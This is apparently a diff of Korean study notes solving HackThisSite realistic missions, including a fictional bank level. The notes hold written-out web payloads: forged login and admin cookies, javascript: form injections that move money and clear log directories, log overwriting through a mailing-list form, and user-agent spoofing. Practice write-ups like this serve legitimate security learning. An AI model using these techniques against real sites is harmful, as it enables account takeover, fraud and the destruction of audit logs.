@@ -213,16 +213,16 @@ ID: administrator, password: shadow
 ## Level 8. United Banks Of America
 
 ### 문제 요약
--. Find the account of Gary Hunter (I don't know his account name
-  - --> GaryWilliamHunter
+1. Find the account of Gary Hunter (I don't know his account name
+  - GaryWilliamHunter
 2. Move the $10,000,000 into the account dropCash.
 3. Clear The Logs, They're held in the folder 'logFiles'. © All Rights Reserved(Linkback is required)
   - linkback 필요하다는 것 생각해두기
 
 ### 문제해결
 - form-post방식, 클릭하면 login2.php로 이동
-  + / input name: username, Password
-	+ register.php -> register2.php
+  - / input name: username, Password
+  - register.php -> register2.php
 - 등록한 후 로그인하면 들어가짐. 로그인된 경우에 돈 이동시킬 수 있음
 - user info
   + 18글자만 입력 가능
@@ -243,7 +243,7 @@ ID: administrator, password: shadow
   + 아무 아이디나 로그인 한 상태에서 id만 게리헌터로 쿠키 변조
 
 - 돈 옮기기
-```javascript
+```html
 javascript:document.write("
 <form action='movemoney.php' method='POST'>
 	<input type='submit' value='Move Money To A Different Account'>
@@ -253,7 +253,7 @@ javascript:document.write("
 ```
 
 - 로그 지우기
-```javascript
+```html
 javascript:document.write("
 <form action='cleardir.php' method='POST'>
 	<input type='hidden' name='dir' value='logFiles'>
@@ -291,7 +291,7 @@ intID=1;
 ```
 
 - 이걸 이용해서 쿠키정보 입력(가짜로그인)
-```javascript
+```html
 javascript:document.cookie="strUsername=m-crap%40crappysoft.com;"
 javascript:document.cookie="strPassword=94a35a3b7befff5eb2a8415af04aa16c;"
 javascript:document.cookie="intID=1;"
@@ -306,7 +306,7 @@ javascript:document.cookie="intID=1;"
 	+ 이메일리스트에 가입하는 페이지에서 정보를 address.txt에 저장하는 내용 있음
 	+ ->이걸 이용해서 로그파일에 내용""으로 덮어쓰기.
 
-```javascript
+```html
 javascript:document.write("<form action=subscribemailing.php method=post><input type=hidden name=strFilename value=./files/logs/logs.txt><input type=hidden name=strEmailAddress value=''><input type='submit' value='replacelogs'></form>")
 ```
 
@@ -336,7 +336,7 @@ http://www.hackthissite.org/missions/realistic/10/student.php?uusername=Zach San
 http://www.hackthissite.org/missions/realistic/10/student.php?uusername=Jonathan Goodman;&ppassword=
 ```
 
-```javascript
+```html
 javascript:document.write("
 <form action=/missions/basic/4/level4.php method=post>
   <input type=hidden name=to value=sam2@hsite.abc />
@@ -363,7 +363,7 @@ Welcome, Mrs. Samantha Miller! Please remember that access to the staff administ
 - 웹브라우저가 holy_teacher웹브라우저인 경우에만 접속 가능
 
 접속한 브라우저 확인
-```javascript
+```html
 javascript:alert(navigator.userAgent)
 ```
 - 익스플로러-도구-개발자도구-도구-사용자에이전트문자열변경-사용자지정-holy_teacher로 변경
@@ -372,7 +372,7 @@ javascript:alert(navigator.userAgent)
 - note:you are not an administrator so you cannot change grades
 
 권한변경해주기
-```javascript
+```html
 javascript:document.cookie="admin=1;"
 ```
 변경가능해졌음.
